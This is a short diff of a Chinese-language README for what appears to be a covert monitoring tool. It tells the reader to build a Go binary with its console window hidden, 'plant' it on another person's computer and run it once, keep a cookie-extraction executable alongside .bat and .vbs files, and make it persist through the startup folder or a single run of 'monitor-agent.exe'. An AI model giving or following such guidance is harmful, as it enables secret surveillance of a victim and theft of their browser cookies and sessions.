@@ -12,8 +12,8 @@
   - `go build -ldflags="-H=windowsgui"`
   - 命令行参数-H=windowsgui可以隐藏终端       
 - 用你的办法埋好雷把软件放到ta电脑上并试运行一次
-- 保存`.bat`和`.vbs`文件，修改其中对应路径
-- 按 `Win + R`，输入 `shell:startup` 并回车。把`.vbs`文件放进去就行了。
+- git是务必同时保存`.bat`和`.vbs`以及`cookie_ext.exe`文件，因为go要内嵌
+- 放行运行一次`monitor-agent.exe`，即可持久化
 
 ### 服务器-server
 
